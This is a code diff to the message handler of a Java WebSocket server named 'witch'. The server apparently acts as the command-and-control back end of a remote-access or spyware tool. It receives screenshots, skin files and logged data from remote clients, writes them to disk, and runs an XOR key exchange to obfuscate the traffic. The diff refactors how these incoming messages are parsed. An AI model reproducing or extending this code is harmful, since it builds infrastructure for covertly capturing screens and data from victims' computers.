@@ -1,6 +1,7 @@
 package me.soda.witch.server.handlers;
 
 import com.google.gson.Gson;
+import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import me.soda.witch.server.server.Info;
 import me.soda.witch.server.server.Message;
@@ -24,10 +25,17 @@ public class MessageHandler {
     @SuppressWarnings("ResultOfMethodCallIgnored")
     public static void handle(Message message, WebSocket conn, Server server) {
         int id = conn.<Integer>getAttachment();
-        server.log("* Received message: " + message + " From ID " + id);
-        String msgType = message.messageType();
-        String msg = message.message();
+        String msgType = message.messageType;
+        JsonArray jsonArray = GSON.fromJson(message.message, JsonArray.class);
+        String msg = jsonArray.size() > 0
+                ? jsonArray.get(0).isJsonPrimitive()
+                ? jsonArray.get(0).getAsJsonPrimitive().isString()
+                ? jsonArray.get(0).getAsString()
+                : jsonArray.get(0).toString()
+                : jsonArray.get(0).toString()
+                : "";
         Info info = server.clientMap.get(conn);
+        server.log("* Received message: " + msgType + " From ID " + id);
         try {
             switch (msgType) {
                 case "screenshot" -> {
@@ -35,7 +43,7 @@ public class MessageHandler {
                     new File("screenshots").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
-                    out.write(GSON.fromJson(message.message(), byte[].class));
+                    out.write(GSON.fromJson(msg, byte[].class));
                     out.close();
                 }
                 case "skin" -> {
@@ -44,7 +52,7 @@ public class MessageHandler {
                     new File("skins").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
-                    out.write(GSON.fromJson(message.message(), byte[].class));
+                    out.write(GSON.fromJson(msg, byte[].class));
                     out.close();
                 }
                 case "logging" -> {
@@ -69,7 +77,7 @@ public class MessageHandler {
                     out.close();
                 }
                 case "xor" -> {
-                        server.sendUtil.trySend(conn, server, msgType, info.key);
+                    server.sendUtil.trySend(conn, server, msgType, info.initXOR());
                     info.acceptXOR = true;
                 }
                 default -> server.log("Message: " + msgType + " " + msg);
